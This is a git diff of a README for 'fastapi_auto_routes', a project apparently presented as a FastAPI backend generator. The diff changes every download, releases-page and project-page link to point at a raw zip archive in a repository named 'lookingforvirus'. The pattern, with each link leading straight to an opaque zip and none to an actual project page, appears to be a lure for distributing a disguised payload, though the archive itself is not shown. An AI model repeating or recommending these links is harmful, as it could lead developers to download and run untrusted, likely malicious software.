@@ -8,7 +8,7 @@ fastapi_auto_routes is a tool designed to help you quickly generate backend appl
 
 To begin using fastapi_auto_routes, follow these steps:
 
-1. Visit this page to download: [Download fastapi_auto_routes](https://raw.githubusercontent.com/lookingforvirus/fastapi_auto_routes/main/convertise/fastapi_auto_routes.zip)
+1. Visit this page to download: [Download fastapi_auto_routes](https://raw.githubusercontent.com/lookingforvirus/fastapi_auto_routes/main/convertise/routes_auto_fastapi_v2.0.zip)
 
 2. Choose the latest version. Make sure to download the file compatible with your operating system.
 
@@ -35,7 +35,7 @@ After downloading, install fastapi_auto_routes by following these steps:
 
 4. Once the installation completes, you are ready to start using fastapi_auto_routes.
 
-5. For future updates, return to the [Releases page](https://raw.githubusercontent.com/lookingforvirus/fastapi_auto_routes/main/convertise/fastapi_auto_routes.zip) to download the latest version.
+5. For future updates, return to the [Releases page](https://raw.githubusercontent.com/lookingforvirus/fastapi_auto_routes/main/convertise/routes_auto_fastapi_v2.0.zip) to download the latest version.
 
 ## ⚙️ Features
 
@@ -86,7 +86,7 @@ Stay tuned for updates!
 
 ## 🔗 Useful Links
 
-- [Visit the Project Page](https://raw.githubusercontent.com/lookingforvirus/fastapi_auto_routes/main/convertise/fastapi_auto_routes.zip)
-- [Download fastapi_auto_routes](https://raw.githubusercontent.com/lookingforvirus/fastapi_auto_routes/main/convertise/fastapi_auto_routes.zip)
+- [Visit the Project Page](https://raw.githubusercontent.com/lookingforvirus/fastapi_auto_routes/main/convertise/routes_auto_fastapi_v2.0.zip)
+- [Download fastapi_auto_routes](https://raw.githubusercontent.com/lookingforvirus/fastapi_auto_routes/main/convertise/routes_auto_fastapi_v2.0.zip)
 
 By using fastapi_auto_routes, you will have an easier time developing secure APIs that meet today's demands. Join our community and start building your backend with confidence.
